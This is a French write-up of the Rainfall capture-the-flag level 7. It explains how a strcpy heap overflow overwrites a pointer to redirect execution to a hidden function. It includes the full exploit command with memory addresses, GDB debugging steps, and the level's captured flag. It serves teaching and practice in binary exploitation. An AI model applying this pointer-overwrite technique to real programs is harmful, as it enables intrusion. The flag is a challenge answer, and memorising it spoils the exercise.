# Rainfall - Niveau 7

## Objectif

Exploiter une vulnérabilité de type buffer overflow pour rediriger l'exécution vers une fonction cachée (`m`) et récupérer le flag.

## Analyse détaillée de la vulnérabilité

Le programme effectue plusieurs allocations mémoire via `malloc(8)` à plusieurs reprises. Chaque appel à `malloc` réserve exactement 8 octets.

La vulnérabilité se trouve dans l'utilisation de la fonction dangereuse `strcpy()`, qui ne vérifie pas la taille du buffer destination. Le premier appel à `strcpy` peut déborder et écraser un pointeur utilisé comme destination lors d'un second appel à `strcpy`. Cette situation permet de détourner le flux d'exécution.

## Stratégie d'attaque

1. Identifier la fonction cible dans le binaire : la fonction `m` située à l'adresse `0x080484f4`.
2. Identifier un pointeur en mémoire pouvant être écrasé afin de contrôler la destination du second appel à `strcpy()`.
3. Construire une commande avec deux arguments :

   * Le premier déborde le buffer initial avec 20 caractères (`"A"`) puis écrase le pointeur cible avec l'adresse contrôlée `0x08049928`.
   * Le deuxième argument contient l'adresse de la fonction `m` (`0x080484f4`).

## Exploit détaillé

Commande utilisée :

```bash
./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
```

### Explication détaillée du fonctionnement de l'exploit

* Premier argument : remplit les 20 octets du buffer initial, puis écrase le pointeur servant de destination au second `strcpy`.
* Second argument : l'adresse de la fonction `m` est placée en mémoire à l'endroit déterminé par l'écrasement précédent, permettant ainsi de détourner l'exécution du programme.

## Utilisation de GDB pour l'analyse

### Étapes avec GDB

1. Lancer GDB avec le programme :

```bash
gdb ./level7
```

2. Définir des breakpoints importants pour suivre l'exécution :

```gdb
(gdb) break strcpy
(gdb) run $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
```

3. Examiner l'état des registres et de la mémoire au moment des breakpoints :

```gdb
(gdb) info registers
(gdb) x/20x $esp
```

4. Désassembler la fonction `main` ou la fonction vulnérable si nécessaire pour bien comprendre ce qu’il se passe :

```gdb
(gdb) disass main
(gdb) disass 0x080484f4
```

5. Observer précisément comment le pointeur en mémoire est modifié :

```gdb
(gdb) x/x 0x08049928
```

Ces étapes permettent de confirmer comment l'exécution du programme est manipulée pour déclencher l’appel à la fonction `m`.

## Flag obtenu

```
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

## Conclusion

Ce niveau illustre précisément comment des fonctions non sécurisées comme `strcpy()` peuvent causer des failles exploitables. L'analyse avec GDB apporte une compréhension plus profonde du processus d'exploitation et de manipulation mémoire nécessaire pour détourner l’exécution.
